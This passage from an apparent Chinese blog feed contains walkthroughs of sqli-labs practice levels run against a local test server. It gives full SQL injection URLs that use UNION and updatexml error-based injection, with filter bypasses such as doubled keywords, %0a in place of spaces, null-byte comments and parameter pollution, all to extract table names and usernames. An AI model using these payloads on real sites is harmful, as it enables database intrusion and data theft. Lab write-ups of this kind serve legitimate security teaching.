<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586933356.png" alt="1584586933356"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">带入，查看结果</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584586941828.png" alt="1584586941828"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十五关a双写</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;1</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847133189.png" alt="1584847133189"></p>
<p>再加上万能单引号进行尝试，报错了，但是这个报错和之前的报错不一样，我们用的?id=1’但是这里面并没有’’1’’所以判定不需要加引号，可以直接使用order by</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847185868.png" alt="1584847185868"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用order by 查询</span><br><span class="line">页面显示or被过滤了，所以进行双写一下</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847372214.png" alt="1584847372214"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;1 oorrder by 3</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847443541.png" alt="1584847443541"></p>
<p>查看注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用-1进行报错显示更多内容</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,3</span><br><span class="line">注入点是2,3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847525027.png" alt="1584847525027"></p>
<p>查看库名</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847555214.png" alt="1584847555214"></p>
<p>查看表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or过滤，进行双写</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(table_name)from infoorrmation_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847647319.png" alt="1584847647319"></p>
<p>查看users表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(column_name)from infoorrmation_schema.columns where table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847709745.png" alt="1584847709745"></p>
<p>其中有字段id，username，password，查看username字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,group_concat(username)from users</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584847766947.png" alt="1584847766947"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十九关JSP环境注入</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>获取当前字段数</p>
<p>这里为什么用两个id呢</p>
<p>因为这是jsp环境下的注入，</p>
<p>?id=1&amp;id=2</p>
<p>其中apache(php)解析最后一个参数，即显示id=2的内容，Tomcat(jsp)解析第一个参数即显示id=1的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;2 &#39; order by 3--+</span><br><span class="line">返回结果正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584961798155.png" alt="1584961798155"></p>
<p>将字段数改为4查看一下是否正确，报错，说明字段位3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584961828322.png" alt="1584961828322"></p>
<p>查看当前注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584961891602.png" alt="1584961891602"></p>
<p>查看当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584961915737.png" alt="1584961915737"></p>
<p>查看表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584961983330.png" alt="1584961983330"></p>
<p>查看users表中字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962029173.png" alt="1584962029173"></p>
<p>查看username字段下的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-29&#x2F;?id&#x3D;1111&amp;id&#x3D;2222 &#39; union select 1,2,group_concat(username)from users--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3JSP%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584962061769.png" alt="1584962061769"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十三关GET联合推荐报错</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88%E6%8E%A8%E8%8D%90%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<h4 id="推荐使用报错注入"><a href="#推荐使用报错注入" class="headerlink" title="推荐使用报错注入"></a>推荐使用报错注入</h4><p>基于之前1’可以返回错误，报错注入直接查看当前数据库</p>
<p>因为该关卡过滤了注释符#和 – 所以需要使用其他方法闭合单引号  ‘   可以使用针对于sql-labs特殊使用的注释符;%00   也可以使用 and ‘1’=’1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;1&#39; order by 4 ;%00</span><br><span class="line">没有这个字段，说明字段是3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88%E6%8E%A8%E8%8D%90%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584691041026.png" alt="1584691041026"></p>
<p>查询库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;221&#39; union select 1,2,database() ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88%E6%8E%A8%E8%8D%90%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584691290532.png" alt="1584691290532"></p>
<p>查询表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;221&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88%E6%8E%A8%E8%8D%90%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584691365594.png" alt="1584691365594"></p>
<p>查询users字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;221&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88%E6%8E%A8%E8%8D%90%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584691409673.png" alt="1584691409673"></p>
<p>查询数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-23&#x2F;?id&#x3D;221&#39; union select 1,2,group_concat(username) from users ;%00</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88%E6%8E%A8%E8%8D%90%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584691449594.png" alt="1584691449594"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十六关过滤空格注释符报错注入</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>初始页面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864096457.png" alt="1584864096457"></p>
<p>使用单引号查看一下报错信息，报错了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864117701.png" alt="1584864117701"></p>
<p>使用注释符注释一下让页面返回正常信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39; --+	或者使用#等注释符都被过滤了，都不能使用</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864183955.png" alt="1584864183955"></p>
<p>查看一下26关源码，发现注释符都被过滤了，连空格都被过滤了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864219593.png" alt="1584864219593"></p>
<p>因为空格和注释符被过滤的这里如果想要闭合单引号可以使用||’1’=’1，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864309399.png" alt="1584864309399"></p>
<p>使用报错注入查看当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里在?id&#x3D;1&#39;后面加||是因为过滤空格</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(database())),1)   ||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864411061.png" alt="1584864411061"></p>
<p>查看数据库的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">information中的or过滤了进行双写infoorrmation</span><br><span class="line">这里就是使用括号的方式来绕过空格</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;&#39;security&#39;))),1)||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584864600610.png" alt="1584864600610"></p>
<p>查看users表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema&#x3D;&#39;security&#39;)%26%26(table_name&#x3D;&#39;users&#39;))),1)   ||&#39;1&#39;&#x3D;&#39;1</span><br><span class="line">这里使用%26(&amp;)不能直接使用&amp;&amp;或者and</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584865214954.png" alt="1584865214954"></p>
<p>查看username中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39; || updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)where(id&#x3D;2))),1)   ||&#39;1&#39;&#x3D;&#39;1</span><br><span class="line">修改where后id的值进行换行查看</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584865186922.png" alt="1584865186922"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十八关a双写</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/</url>
    <content><![CDATA[<p>查看源码，这里查询语句用(‘id’)也就是说要用’)进行闭合。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933523420.png" alt="1584933523420"></p>
<p>只有 /union\s+select/过滤了之外其他的都没过滤，而且是union+select，也就是说这两个连在一起才会过滤</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933569676.png" alt="1584933569676"></p>
<p>先查看字段数，以为order by 没被过滤，直接使用order by 即可，3返回正常，4返回错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933746277.png" alt="1584933746277"></p>
<p>查询当前注入点使用union select 报错了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933790903.png" alt="1584933790903"></p>
<p>没有显示union select 表示过滤了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933805272.png" alt="1584933805272"></p>
<p>进行双写试试，双写之后还是报错</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933861053.png" alt="1584933861053"></p>
<p>查看一下报错原因没发现union select 连在一起了，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933879202.png" alt="1584933879202"></p>
<p>使用%0a进行空格开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;1&#39;)  union  %0a  union  selectselect 1,2,3  --+</span><br><span class="line">页面返回正常，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584934773030.png" alt="1584934773030"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584934789573.png" alt="1584934789573"></p>
<p>因为页面只回显正确的，所以将id进行报错</p>
<p>页面返回注入点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,3  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584934850068.png" alt="1584934850068"></p>
<p>查看当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,database()  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584934884885.png" alt="1584934884885"></p>
<p>查看当前数据库中的表</p>
